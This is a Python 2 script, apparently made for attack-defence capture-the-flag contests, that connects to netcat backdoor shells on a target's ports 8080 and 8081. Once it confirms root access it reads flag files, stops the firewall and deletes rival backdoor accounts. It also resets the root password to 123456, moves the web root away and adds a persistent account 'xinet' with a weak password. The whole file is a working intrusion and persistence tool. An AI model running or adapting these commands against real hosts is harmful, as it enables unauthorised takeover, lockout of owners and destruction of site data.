# coding=utf-8

import pexpect
import optparse
import os

parser = optparse.OptionParser()
parser.add_option('-t', dest='target', type='string')

(options, args) = parser.parse_args()

target = options.target
port_list = [8080, 8081]

if options.target is None:
    parser.print_help()
    exit(0)

for port in port_list:
    cmd = 'nc %s %d' % (target, port)
    child = pexpect.spawn(cmd)

    # 判断后门的连通性
    child.sendline('whoami')
    # 多次经验,大概率是ROOT权限,如果没返回ROOT就跳过
    if child.expect(['root', pexpect.TIMEOUT, pexpect.EOF], timeout=1) != 0:
        print '[X] %s:%d close' % (target, port)
        continue

    print

    # 储存的路径
    path = os.path.join(os.getcwd(), 'nc_flag_%s_%d' % (target, port))

    # python 2.4以上才可以使用with语句
    with open(path, 'wb+') as f:

        child.logfile_read = f

        # 获取flag值
        child.sendline('cat /root/flag*')

        # 没多大用
        child.sendline('/sbin/service sshd start')
        child.sendline('/sbin/service xinetd start')
        child.sendline('/sbin/service iptables stop')

        # 帮他删除后门账号
        child.sendline('/usr/sbin/userdel -f admin')
        child.sendline('/usr/sbin/userdel -f hacker')
        child.sendline('/usr/sbin/userdel -f test')

        # 帮助他修改密码,当然这可能会导致他再也不能给自己加固了
        child.sendline('echo root:123456 | /usr/sbin/chpasswd')

        # 帮他删除危险的网页内容
        child.sendline('mv /var/www/html /tmp/backup/')

        # 这个就不用了
        # child.sendline('echo "XD You has been hacked" | wall')

        # 为后面的刷分做准备
        child.sendline('/usr/sbin/useradd xinet')
        child.sendline('passwd xinet')
        child.sendline('123456')
        child.sendline('123456')

        # 退出,后门也会被关闭
        child.sendline('exit')
        child.expect(pexpect.EOF)
        print '[File] %s:%d : %s' % (target, port, path)

    # 因为netcat和pexpect的原因,只能这么获取flag值
    with open(path, 'r') as f:
        flag = f.readlines()[1].replace('\n', '')
        print '[Flag] %s:%d - %s' % (target, port, flag)
        print '[Usage] python auto_flag.py -t %s -f %s' % (target, flag)
        print
